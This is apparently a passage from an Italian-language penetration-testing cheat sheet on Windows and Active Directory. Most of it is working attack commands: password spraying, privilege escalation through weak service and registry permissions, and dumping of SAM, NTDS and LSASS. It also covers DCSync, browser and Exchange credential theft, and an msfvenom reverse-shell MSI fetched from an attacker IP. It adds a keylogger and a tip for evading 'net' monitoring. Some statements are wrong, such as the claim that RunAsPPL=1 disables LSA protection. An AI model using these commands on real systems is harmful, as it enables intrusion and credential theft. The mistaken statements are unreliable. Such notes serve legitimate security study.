__N.B: se nella target machine non abbiamo disponibile RSAT, possiamo sfruttare un trick cioè in una vm locale, installare RSAT per poi andare alla seguente path "C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management" copiare la dll del RSAT e importarla nella target machine infine ad ogni commando basterà aggiungere la flag -Server__

- _Spraying:_

_Lo spraying tradotto in spruzzare è una tecnica di accesso che a seconda delle informazioni in nostro possesso (un nome utente valido e una lista di password | una lista di utenti e una password valida | una lista di utenti e una lista di password) tentiamo accessi ripetuti su molteplici utenti_

__N.B: Questa tecnica va utilizzata con parsimonia in quanto: è molto rumorosa, potremmo bloccare account validi per i troppi tentati accessi__

_I primi passi sono quelli di recupero di nomi utenti (tramite ldapsearch, [CrackMapExec](./#CrackMapExec), kerbrute e ecc...), recupero di password policy (tramite i comandi "net", [CrackMapExec](./#CrackMapExec) e ecc ...) e [creazioni di wordlists](./#creazione-di-wordlists).
Una volta ottenuto tutto il necessario è possibile eseguire la tecnica di spraying con tool come [CrackMapExec](./#CrackMapExec) (i comandi sono spiegati nella sezione relativa) o con lo script [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) se abbiamo accesso ad una macchina windows_

_Comandi:_
```powershell
Import-Module .\DomainPasswordSpray.ps1 #comando per importare il modulo .ps1
```
```powershell
Get-DomainUserList -Domain <nome dominio> -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii <nome file output> #comando dello script che genera una wordlist di utenti
```
```powershell
Invoke-DomainPasswordSpray -UserList <nome file lista di users> -Domain-name <nome dominio> -PasswordList <nome file lista di password> -ErrorAction SilentlyContinue #comando per eseguire lo spraying su una lista di user con una lista di password
```
__N.B: dello script "DomainPasswordSpray" ci sono altre flag da poter utilizzare è bene visionare l'help dei comandi__

### Enumerazione host machine:

_Un passo importante oltre all'enumerazione esterna e interna è ricavare informazioni dalle varie host machine su cui uno ottiene l'accesso_

##### Sistema:
```cmd
tasklist /svc #comando per listare i servizi
```
```cmd
set #comando CMD per listare le variabili d'ambiente
```
```cmd
systeminfo #comando per listare informazioni sul PC, nello specifico anche quando sono stati fatti vari aggiornamenti
```
```cmd
wmic product get name /format:List #comando CMD per listare i programmi installati
```
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:List #comando per vedere hotfix del sistema e quando sono stati effettuati
```
```cmd
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List #comando che recupera informazioni sul pc 
```
```cmd
wmic ntdomain list /format:list #comando per recuperare informazioni sui domini
```
```cmd
vssadmin list shadows #comando per listare le shadowcopies
```
```cmd
query user #comando che lista gli utenti attivi tramite RDP
```
```cmd
qwinsta #comando per controllare se altri utenti sono connessi
```
```cmd
qwinsta /server:<nome o indirizzo ip> #comando per controllare se altri utenti sono connessi ma ad un server in remoto
```

##### Generali:
```cmd
whoami /priv #comando che indica i privilegi che ha il nostro user corrente
```
```cmd
net user #comando che lista tutti gli utenti locali
```
```cmd
net user /domain #comando per listare tutti gli utenti nel dominio
```
```cmd
net user <nome utente> /domain #comando per ricavare più informazioni sull'utente specificato nel dominio
```
```cmd
net localgroup #comando che lista tutti i gruppi locali
```
```cmd
net localgroup <nome gruppo> #comando che dato un gruppo ci fornisce ulteriori informazioni
```
```cmd
net share #comando che recupera informazioni sugli shares
```
```cmd
net use \\<nome del server>\<nome dello share>  /user:<nome utente e password> #comando per accedere e visionare uno share di SMB se disponibile
```
```cmd
net use \\<ip>\ipc$ "" /u:"" #comando che tenta l'autenticazione tramite la null session di SMB
```
```cmd
net group /domain #comando per listare i gruppi nel dominio
```
```cmd
net group <nome gruppo> /domain #comando per listare i membri del gruppo specificato
```
```cmd
net accounts #comando che lista le password policy in locale
```
```cmd
net accounts /domain #comando che lista le password policy a dominio
```
```cmd
findstr /I /S /M "<parola da ricercare>" *.<estensione file> #comando per ricercare una specifica parola nei file indicati da noi
```
```cmd
dir -Path C:\ -Recurse -Filter "<nome file>" -File #comando per ricercare uno specifico file
```
```cmd
cmd /c dir /q '<path cartella>' #comando per listare il proprietario di una determinata cartella
```

__N.B: Piccolo consiglio i comandi con l'utility "net" potrebbero essere monitorati è possibile usarli comunque scrivendo con il comando "net1"__

##### Rete e configurazioni:
```cmd
ipconfig /all #comando per listare le configurazioni di rete
```
```cmd
arp -a #comando per listare ARP table
```
```cmd
route print #comando per listare le routing table
```
```cmd
netstat -ano #comando per listare connessioni attive e porte in ascolto
```
```cmd
netsh wlan show profile #comando per listare le interfacce wlan
```
```cmd
netsh wlan show profile <nome interfaccia> key=clear #comando per mostrare la password in chiaro
```
```cmd
netsh advfirewall show currentprofile #comando per listare il profilo corrente del firewall
```
```cmd
netsh advfirewall show allprofiles state #comando che mostra tutti i profili
```
```cmd
netsh advfirewall firewall show rule name=all #comando che lista tutte le regole del firewall
```
```cmd
netsh trace start capture=yes report=disabled
netsh trace stop #comandi per avviare e poi quando vogliamo stoppare lo sniffing della rete
```
_I pacchetti catturati con netsh sono salvati con estensione __".etl"__ ma possono essere converiti in .pcap con il seguente [tool](https://github.com/microsoft/etl2pcapng)_
```cmd
etl2pcapng.exe <file>.etl <path file dove salvarlo> #comando per convertire il .etl in .pcap
```

### Tools:

_Come per ogni cosa esiste un tool per automatizzare il processo ed è:_

- [Bloodhund](./#bloodhund) link diretto alla sezione apposita
- [PowerView](./#powerview) link diretto alla sezione apposita

# Privilege Escalation:

 _Metodi per scalare i propri privilegi in windows e controllare permessi che potrebbero essere vettore di privilege escalation_

### Servizi:
 
- __Abusare permessi insicuri nei servizi:__

_Per controllare le misconfiguration utilizzeremo accesschk.exe (utility che serve a controllare i permessi ACL su oggetti di sistma Windows) è contenuto nella 
suite di sysmon scaricabile dal seguente [link](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):_
```cmd
accesschk.exe /accepteula -uwcqv <nome utente> <nome servizio> #restituisce i permessi dell'utente relativi al servizio ricercato
```
_se l'utente ha il seguente privilegio __"SERVICE_CHANGE_CONFIG"__ può essere vettore di privilege escalation:_

_facciamo una query al servizio per controllare che giri come SYSTEM (o LocalSystem) sotto la voce __"SERVICE_START_NAME"___
```cmd
sc qc <nome servizio> #fa una query al servizio per ottenere i suoi dettagli
```
_a questo punto possiamo sostituire il binario puntato dal servizio con uno creato da noi per farlo eseguire al riavvio:_
```cmd
sc config <nome servizio> binpath= "\"<path al nostro eseguibile>\"" #indichiamo la path con gli apici attraverso l'escape character
```
```cmd
net start <service> #avviando il servizio verrà lanciato il nostro eseguibile come amministratore
```
- __abusare di path non racchiuse da doppi apici:__

_se la path di un servizio è scritta nel seguente modo:_
```
BINARY_PATH_NAME: <Path al servizio>\<directory>\.. #quindi non racchiusa dalle virgolette 
```
_può essere vettore di privilege escalation perchè senza doppie virgolette la path viene letta male dal sistema e con gli spazi che vengono interpretati come dei break, windows proverà ad eseguire un qualcosa prima di ogni spazio_

ES:
`C:\Windows\Tasks\rev.exe`

`C:\rev.exe`

`C:\Windows\rev.exe`

`C:\windows\Tasks\rev.exe`

_possiamo di conseguenza inserire un eseguibile (sempre se ho i permessi di write sui servizi e sulla directory da modificare)._
```cmd
copy <Path del nostro eseguibile> "<path del servizio>\Common.exe" #così facendo il sistema cercherà la path e arrivato allo spazio eseguirà il nostro comando prendendo i dati successivi come argomenti dell'eseguibile
```
```cmd
net start <nome servizio> #comando per startare un servizio
```
- __Abusare di eccessivi permessi di modifica delle chiavi di registro:__
```cmd
sc qc <nome servizio> #comando che fa una query al servizio
```
```cmd
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<nome servizio> #comando che controlla i permessi e chi ha accesso alle chiavi di un servizio di registro
```
___"NT AUTHORITY\INTERACTIVE"__ se le chiavi sono accessibili da questo gruppo significa che tutti gli utenti con logon possono modificarle:_
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\<nome_servizio> /v <ImagePath> /t REG_EXPAND_SZ /d <path nostro eseguibile> /f #comando che aggiunge una chiave di registro
```
```cmd
net start <nome servizio> #comando che starta un servizio
```
- __Abusare permessi di scrittura sugli eseguibili dei servizi:__
```cmd
sc qc <nome_servizio> #comando che fa una query al servizio
```
```cmd
C:\PrivEsc\accesschk.exe /accepteula -quvw "<path servizio>" #comando che fa una query sui permessi di sicurezza di un servizio
```
 _Notiamo che il __"BINARY PATH NAME"__ è scrivibile da tutti_
```cmd
copy <nostro_eseguibile> <pat binario del servizio> #se abbiamo permessi di scrittura sull'eseguibile del servizio possiamo sostituirlo con il nostro 
```
### Registri:

_La spiegazione di cosa sono e di quali sono i registri si trova [qui](./#register-keys)_

- __Abusare degli autorun attraverso le chiavi di registro:__
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #interroga i registri per cercare eseguibili con autorun
```
```cmd
accesschk.exe /accepteula -wvu "<path dell'eseguibile>" #ricerca le proprietà degli eseguibili che sono autorun
```

_se l'eseguibile è word-writable possiamo sostituirlo con il nostro e riavviare la macchina:_
```cmd
copy <nostro_eseguibile_da_runnare> "<path autorun>" /Y  #dopo il riavvio si attiverà automaticamente
```
- __Abusare dei privilegi di installazione come amministratore (permettono di installare sempre un programma come amministratore)__
  
_Andremo a controllare tramite la reg query se AlwaysInstallElevated è settato a 1 o 0, AlwaysInstallElevated controlla la richiesta di elevazione dei privilegi del MSI installer, se settato a 0 l'installer richiede di elevare i privilegi solo quando serve invece se ad 1 l'installer lo richiede sempre cosi facendo può essere vettore di privilege escalation._
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #interroga le chiavi di registro
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #se sono settate su 0x1 sono attive
```
_possiamo creare un installer con msfvenom per richiamare una revshell da amministratore quando installato:_
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip_attaccante> LPORT=<porta_attaccante> -f msi -o <nome file>.msi #comando per generare il .msi malevolo
```
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost <ip>; set lport <porta>; exploit" #comando per preparare il listener
```
```cmd
msiexec /q /i http://<ip>/<nome file malevolo>.msi
msiexec /i <path al file .msi> /quiet /qn /norestart #comandi per eseguire il file .msi
```
- __AutoLogon:__

_L'autologon è un'impostazione che permette ad un utente di poter fare l'accesso senza dover richiedere di inserire manualmente nome utente e password, il tutto funziona con due chiavi di registro la prima __"DefaultUserName"__ e la seconda __"DefaultPassword"___

_Comandi:_ 
```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" #comando CMD per una query alla chiave di registro contenenti la defaultusername e la defaultpassword
```

__N.B: Le credenziali salvate in chiaro non sono mai una buona cosa, se si vuole utilizzare l'autologon è bene utilizzare il tool [AutoLogon.exe](https://learn.microsoft.com/it-it/sysinternals/downloads/autologon) che cripta le password in LSA__

_la path __"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"__ contiene altre voci interessanti utilizzate in una [tecnica di persistence](./#varie-2)_

### Credenziali:

_Questa sezione fa riferimento a luoghi generali o errori di dove possano esservi delle credenziali_

- __Dumping di password dai registri:__

_Comandi:_
```cmd
reg query HKLM /f password /t REG_SZ /s #ricerca dei registri che contengono la parola password
```
- __Dumping di password dal credmanager:__

_Comandi:_
```cmd
vaultcmd /list #comando per vedere se sono presenti dei vaults per le password
```
_Nel credmanager di solito sono 2 i vaults uno web e uno windows, per recuperare quello Web esiste uno script powershell che si scarica da [qui](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)_
```cmd
powershell -ex bypass #comando per poter attivare lo script
```
```powershell
Import-Module .\Get-WebCredentials.ps1 #comando per importare il modulo
```
```powershell
Get-WebCredentials #comando per recuperare le credenziali dal vault web     
```  
_Esiste poi un tool chiamato __"cmdkey"__, utilizzato per creare, eliminare o modificare le credenziali registrate nel credmanager può essere utilizzato con la command-line __"RunAs"___
```cmd
cmdkey /list #comando per listare possibili credenziali salvate
```
```cmd 
runas /savecred /user:<dominio\nome utente oppure solo nome utente> cmd.exe #comando che tramite le credenziali salvate apre una nuova shell con l'utente specificato
``` 
- __Dumping del SAM e del SYSTEM:__

_Se abbiamo la fortuna di trovare in giro un backup del SAM o del SYSTEM o ancora meglio, avere privilegi come SeBackup/SeRestore (permettono di leggere e scrivere ogni file del fileysystem bypassandro le ACL) o fare parte del gruppo Backup Operators possiamo salvarceli e dumpare le credenziali_

_Comandi:_
```cmd  
reg save hklm\system C:\Users\backup\system.hive
reg save hklm\sam C:\Users\backup\sam.hive
reg save hklm\system system.bak
reg save hklm\sam sam.bak
#tipologie di comandi per salvare SAM e SYSTEM
```
```cmd  
copy C:\Windows\Repair\Systen.hive \\<ip destinazione>\<nome share>\ 
copy C:\Windows\Repair\sam.hive \\<ip destinazione>\<nome share>\ #comandi per passarsi i backup tramite SMB
```
```bash  
secretsdump.py -sam sam.bak -system system.bak LOCAL #comando che utilizza la suite impacket per recuperare gli hash
```
- __Dumping NTDS:__

_NTDS è un database contenente dati, credenziali per un domain controller, di default è situato in __"C:\Windows\NTDS"__ e per gestirlo viene utilizzata una utility apposta chiamata __"Ntdsutil"___

__Bisogna avere dei permessi d'amministratore__

_File richiesti:_
```
C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```    
_Comandi:_
```cmd
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\prova' q q" #comando che tramite ntdsutil fa il dump dei file richiesti
```
```bash
secretsdump.py -security <path SECURITY file> -system <path SYSTEM file> -ntds <path ntds.dit file> local #comando che tramite secretsdump, dumpa il DB e ottiene gli hash 
```
```bash
secretsdump.py -ntds <path ntds.dit file> -system <path SYSTEM file> -hashes <lmhash:nthash> LOCAL #comando alternativo da utilizzare se non si dispone del SYSTEM file
```
_Impostazioni di default settano il ntds.dit non accessibile cioè bloccato ma tramite l'utility __"diskshadow"__, possiamo fare un shadow copy(backup) del volume __"C"__ su un altro volume tipo __"F"___
```cmd
diskshadow.exe #comando che avvia diskshadow
```
```cmd    
set verbose on #comando che mette in azione la modalità verbosa
```
```cmd   
set metadata <path dove salvare i metadati>.cab #comando che imposta dove salvare i metadati della shadow copy
```
```cmd    
set context clientaccessible #comando che imposta il contenuto accessibile agli utenti
```
```cmd
set context persistent #comando che imposta il contenuto in maniera persistente
```
```cmd   
begin backup #comando che fa partire il backup
```
```cmd   
add volume C: alias <nome alias> #comando che aggiunge il volume C per farne la shadowcopy e poi imposta un alias
```
```cmd    
create #comando che inizia la creazione
```
```cmd    
expose %cdrive% F: #comando che monta la copia del disco C nel nuovo volume F
```
```cmd    
end backup #comando che finisce il backup
```
```cmd    
exit #comando che esce da diskshadow
```
_Infine per eliminare la shadowcopy possiamo procedere con i seguenti comandi:_
```cmd
vssadmin list shadows #comando per listare le shadowcopies
```
```cmd
vssadmin delete shadows /shadow=<id della shadowcopy> #comando per listare la shadowcopy
```

- __LAPS:__

_LAPS è utilizzato per la gestione centralizzata delle password, permettendo la generazione, rotazione e ripristino delle password_

_Comandi:_
```cmd
dir "C:\Program Files\LAPS\CSE" #comando per vedere se presente LAPS, infatti se presente troviamo una .dll
```
```powershell
Get-Command *AdmPwd* #comando per capire che cmdlets possiamo utilizzare con il nome AdmPwd
```
```powershell
Find-LAPSDelegatedGroups | fl * #comando per cercare i gruppi che possono leggere le password gestite da LAPS
```
```powershell
Find-AdmPwdExtendedRights -Identity * #comando per cercare quale OU ha "All extended rights"
```
```powershell
Get-LAPSComputers #comando che ottiene i computer dove è configurato il LAPS
```
```cmd
net groups "<nome gruppo>" #comando per vedere i membri del gruppo ai quali dovremmo accedere
```
```powershell
Get-ADComputer -Filter * | fl * #comando per listare il nome del computer con LAPS attivo, in quanto non tutti lo hanno
```
```powershell
Get-AdmPwdPassword -ComputerName <nome computer> #comando per recuperare la LAPS password 
```
_Esistono diversi script o tool per automatizzare la ricerca uno è possibile scaricarlo da [qui](https://github.com/leoloobeek/LAPSToolkit)._

- __Credenziali di WDS:__
  
_Quando si vuole installare una stessa immagine di windows ma su più macchine nella rete è possibile utilizzare Windows Deployment Services, il quale installa la stessa image su diversi computer attraverso la rete e lo fa in maniera autonoma; può capitare che all'interno di determinati file possano esserci ancora delle credenziali_

_cartelle:_
```  
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```  
- __History powershell e cmd:__

_windows in un file .txt tiene traccia dei comandi powershell e cmd che vengono eseguiti e possiamo recuperarli con questi comandi:_
```cmd  
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando CMD per aprire la history 
```
```powershell  
Get-ChildItem C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando Powershell per aprire la history
```  
- __Configurazione IIS:__

_IIS(Internet Information Service) è il web server di default in windows, dove è possibile che vi siano delle credenziali nel file __"web.config"___

_Comandi:_

_Ecco le cartelle dove poter andare a vedere_ 
```  
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```  
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #comando per cercare le credenziali
``` 
- __Putty proxy configurations:__

_Putty è un SSH client che troviamo spesso nelle windows machine, è possibile recuperare le sue proxy configuration, dove tiene le credenziali in chiaro_

_Comandi:_
```cmd  
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s #comando che fa una query e tenta di recuperare le credenziali
```

- __LSASS:__

_Il servizio che si occupa dell'autenticazione nei sistemi windows o nell'AD, è un target fondamentale per il recupero di password hashes e ticket, può essere dumpato in diverse maniere._

_Comandi:_

_Disponendo di una GUI alla target machine è possibile tramite task manager dumpare LSASS:_
```
Task Manager-> lsass.exe-> Creare file di dump della memoria #passi per creare un dump del LSASS
```
_Possiamo dumpare anche se abbiamo a disposizione [procdump della SysInternal suite](./#processi):_
```
procdump.exe -accepteula -ma lsass.exe c:\Windows\lsass_dump #comando per dumpare tramite procdump
```
_Sorge però un problema, i metodi sopra spiegati non funzionano se prima non viene disattivata la protezione LSA con i seguenti metodi:_
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa #path della key da cercare
```
```
RunAsPPL = 1 #value della key che va modificata in 1 per disattivare LSA
```
_Se il tutto funziona avendo disattivato la protezione LSA, possiamo recuperare dal dump del LSASS diverse informazioni grazie al tool python __"pypykatz"___
```bash
pip3 install pypykatz #comando per installare pypykatz
```
```bash
pypykatz lsa minidump lsass.DMP #comando per recuperare le informazioni dal dump
```
 _Altrimenti se si dispone di [Mimikatz](./#mimikatz), il processo puà essere velocizzato grazie al tool_

- __DCSync attack:__

_Consiste nel simulare il comportamento di un domain controller e poter recuperare le password di altri utenti tramite replicazione di dominio e soprattutto tramite il dirito __"DS-Replication-Get-Changes-All"___

__N.B: Bisogna disporre delle credenziali giuste dell'utente target__

_Prima di effettuare l'attacco abbiamo bisogno che l'utente target abbia i diritti richiesti __"Replicating Directory Changes"__ e __" Replicating Directory Changes All permissions"__ viene in nostro aiuto il tool [Powerview](./#powerview)_

_Comandi:_
```powershell
Get-DomainUser -Identity <utente target> | fl #comando per recuperare sid target e DN 
```
```powershell
$sid= "<sid recuperato>"
Get-ObjectAcl "<DN target>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl #comando di powerview per verificare di avere i privilegi necessari
```
_Orq possiamo procedere in due maniere, la prima è con __"secretsdump.py"__ di [impacket](./#impacket)_
```powershell
secretsdump.py -outputfile <nome output file> -just-dc <dominio>/<utente target>@<ip domain controller> #comando per dumpare tutte le password
```
_La seconda è con [mimikatz](./#mimikatz) se disponibile nella macchina vittima_
```powershell
runas /netonly /user:<dominio>\<utente target> powershell #comando che tramite runas avvia una nuova shell con l'utente target
```
```powershell
mimikatz lsadump::dcsync /domain:<nome dominio> /user:<nome utente> #comando che esegue il dcsync su un utente
```
```powershell
mimikatz lsadump::dcsync /domain:<nome dominio> /all #comando che esegue il dcsync su tutti gli utenti
```

- __Metasploit Keylogger:__

_La msfconsole dispone di un keylogger integrato che può ritornare molto utile per il recupero di eventuali password_

_Comandi:_
```bash
keyscan_start #comando per avviare il keylogger
```
```bash
keyscan_dump #comando per dumpare quello che ha registrato il keylogger
```
```bash
keyscan_stop #comando per fermare il keylogger
```
_per una maggiore comprensione di Metasploit andare [qui](./#metasploit)_

- __GPP (Group Policy Preferences):__

_le GPP (Group Policy Preferences) fa parte delle [GPO](./#gruppi) (nella sezione persistence sotto la voce gruppi vi è una spiegazione delle GPO), le GPP permettono una maggiore flessibilità nel gestire le policy e le impostazioni del computer ma inoltre permettono di registrare le credenziali in diversi casi all'interno dell'AD.
Le credenziali sono criptate con AES però la stessa Microsoft ne' ha rilasciato la chiave tra i propri [Docs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) e tramite il tool della suite [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) possiamo recuperare le credenziali_

_Comandi:_
```powershell
Import-Module .\Get-GPPPassword.ps1 #comando per importare il modulo Get-GPPPassword.ps1
```
```powershell
Get-GPPPassword #comando del modulo
```
_Una volta recuperate le credenziali possono essere recuperate tramite la chiave pubblicata da Microsoft_

- __StickyNoteas(Memo):__

_Un normale utente per comodità può copiare le credenziali e lasciarle nell' app Memo_

_Comandi:_
```powershell
gci C:\Users\<nome utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState #comando per visionare la presenza di db sqlite
```
_Sono due le opzioni se vi sono presenti dei db .sqlite, la prima è copiarli in [sqlitebrowser](https://sqlitebrowser.org/dl/) o utilizzare il modulo [PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite)_

1) sqlite browser:

_Il primo metodo è abbastanza semplice, una volta individuati i db, vanno scaricati e aperti con il relativo software_

2) PSSQLite:
```powershell
Set-ExecutionPolicy Bypass -Scope Process #comando per settare la execution policy della shell corrente in modalità Bypass
```
```powershell
Import-Module .\PSSQLite.psd1 #comando per impotare il modulo
```
```powershell
$db = 'C:\Users\<nome utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\<nome file>.sqlite' #comando per salvare la path del .sqlite target
```
```powershell
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap #comando per estrarre i dati tramite una query
```

__N.B: possiamo utilizzare pure il comando strings sulla nostra machine però non è molto consigliato se il db è troppo grande__

- __Browser passwords:__

_Ogni browser permette di salvare le password offline ma tramite tool specifici è possibile recuperarle:_

1) [SharpChrome](https://github.com/GhostPack/SharpDPAPI)
```powershell
.\SharpChrome.exe logins /unprotect #comando del tool sharpchrome per recuperare la password
```
2) [Firefox decrypt](https://github.com/unode/firefox_decrypt)
```bash
python3 firefox_decrypt.py <path al file profiles.ini> #comando del tool firefox decrypt per recuperare la password
```
3) [Chromium-Based](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)
```powershell
.\Invoke-SharpChromium -Command "cookies <nome sito>" #comando del tool sharpchromium per recuperare le credenziali
```
__N.B: Il codice di "SharpChromium" punta alla seguente path "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" invece va a cambiata con la seguente path "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies"__

- __Microsoft Exchange:__

_Micorsoft exchange è il software adibito da server di posta elettronica e al suo interno vi è la possibilità di trovare delle credenziali lasciate da qualche utente_

_Comandi:_
```
https://<server exchange>/autodiscover/autodiscover.xml #comando per scoprire le impostazioni del windows exchange 
```
```
https://<server exchange>/EWS/Exchange.asmx #comando per scoprire la versione del windows exchange
```
_Il recupero della versione è possibile anche tramite uno script python chiamato [get_exchange_version.py](https://github.com/3gstudent/Homework-of-Python/blob/master/get_Exchange_version.py)_
```bash
sudo python3 get_exchange_version.py https://<mail target> #comando per utilizzare lo script e scoprire la versione
```
_Un tool che approfondisce la ricerca di credenziali è [MailSniper](https://github.com/dafthack/MailSniper)_
```powershell
Import-Module MailSniper.ps1 #comando che importa il modulo
```
```powershell
Invoke-GlobalMailSearch -ImpersonationAccount <nome utente da impersonare> -ExchHostname <hostname server> -OutputCsv <nome file .csv> #comando che si connette al server exchange il quale poi tramite il privilegio 
"ApplicationImpersonation" (permette di vedere le altre caselle postal) farà un dump delle email contenenti termini come password, creds, ecc...
```
```powershell
Invoke-SelfSearch -Mailbox <email target> #comando che recupera l'email dell'utente corrente le quali hanno la possibilità di contenere termini come: credentials,password e ecc..
```
```powershell
Get-MailboxFolders -Mailbox <email target> #comando che tenta di recuperare una lista di cartelle dalla casella postale corrente
```
```powershell
Get-GlobalAddressList -ExchHostname <email target> -UserName <dominio>\<nome utente> -Password <password> -OutFile <nome file .txt> #comando  che si connette ad Outlook web Access(OWA) e tramite la funzione "FindPeople", tenta di recuperare la global address list delle email
```
```powershell
Invoke-PasswordSprayOWA -ExchHostname <email target> -UserList <path userlist> -Password <password> -Threads <num threads> -OutFile <nome file .txt>
Invoke-PasswordSprayEWS -ExchHostname <email target> -UserList <path userlist>  -Password <password> -Threads <num threads> -OutFile <nome file .txt>
Invoke-PasswordSprayGmail -ExchHostname <email target> -UserList <path userlist>  -Password <password> -Threads <num threads> -OutFile <nome file .txt>
#comandi uguali che tentano il password spray ma su servizi diversi, il primo su Oulook Web Access, il secondo su Exchange Web Services ed infine il terzo su Gmail
```
```powershell      
Invoke-UsernameHarvestOWA -ExchHostname <email target> -UserList <path userlist> -Threads <num threads> -OutFile <nome file .txt> 
Invoke-UsernameHarvestGmail -UserFile <path userlist>
#comandi uguali che tentano di recuperare user validi da servizi differenti
```
- __File SCF:__

_I file SCF (Shell Command File), sono file utilizzati per l'esecuzione di comandi per il sistema operativo, aprire risorse o applicazioni; nel nostro caso verranno impiegati per puntare a uno share pubblico dove ci permetterà poi tramite responder di recuperare NTLMv2 della vittima_

_Comandi:_

_Primo passo creare un file chiamato cosi __"@<nome>.scf"__, la __"@"__ indica all'explorer di windows che il file sarà posizionato alla prima posizione dello cartella e subito eseguito dall'explorer di windows.
Secondo passo, consiste nell'inserire il relativo codice all'interno del file:_ 
```ini
[Shell]
Command=2
IconFile=\\<ip>\<nome share>\<fake file>.ico
[Taskbar]
Command=ToggleDesktop
#comandi che puntano ad un finto share di SMB
```
```bash
sudo responder -I <nome interfaccia di rete> #comando per avviare responder
```
_Infine tentiamo di craccare l'hash con hashcat_
```bash
hashcat -m 5600 <nome file hash> <path wordlist> #comando per avviare hashcat
```
- __File XML crittografati:__

_Powershell permette di fare scripting all'interno dei file XML e può capitare che all'interno del filesystem possiamo trovarci questo tipo di file:_
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">010000ewfefew00d08c9ddf0115d1118c7a00c04fc297eb010000sdfds009db56a0543f441469fc81aadb02945d200000dsf0000200000few0000003660000c000010000efw000069a026f82c590fa867556fe4495ca87000048000a00sdf000100003b5bf64299ad06afde3fc9d6efe72d355000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62df</SS>
    </Props>
  </Obj>
</Objs>
```
__N.B: il file è solo di esempio provare a decriptarlo non darà alcun risultato valido__

_Esistono dei comandi per recuperare la password e altri dati:_

```powershell
$data = Import-Clixml -Path <path file xml> #comando per importare il file all'interno di una variabile powershell
```
```powershell
$data.GetNetworkCredential().UserName
$data.GetNetworkCredential().Domain
$data.GetNetworkCredential().Password #comandi uguali che differiscono per cosa recuperano dal file xml infatti: uno l'username, l'altro il dominio e l'ultimo la password crittografata
```
- __Kerberoasting via Rubeus:__

_Il kerberoasting è la pratica di recuperare i TGS degli account SPN(Service Principal Name), questa tipologia di attacco può essere portato a termine da una macchina linux con la [suite impacket](./#impacket) ma se invece avessimo accesso ad una macchina windows è possibile eseguirlo con il tool [Rubeus](https://github.com/GhostPack/Rubeus)_

_Comandi:_
```powershell
.\Rubeus.exe kerberoast /stats #comando per listare informazioni sugli utenti vulnerabili al kerberoasting
```
```powershell
.\Rubeus.exe kerberoast /user:<nome utente> /nowrap #comando per recuperare il TGT dell'utente specificato
```

##### Tools:

_Esistono diversi tool che automatizzano il recupero di credenziali quali:_

- [Snaffler](https://github.com/SnaffCon/Snaffler)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)
- [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

_Viene allegato pure un [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) con comandi e dove cercare per eventuali credenziali lasciate in giro_

### Varie:

- __Utilizzo di GUI:__

_Quando possibile se si ha accesso ad una windows machine cioè tramite RDP ed è quindi possibile utilizzare la GUI vi è la possibilità di avere degli eseguibili che runnano in modalità privilegiatà, puù essere utile un commando_
```cmd
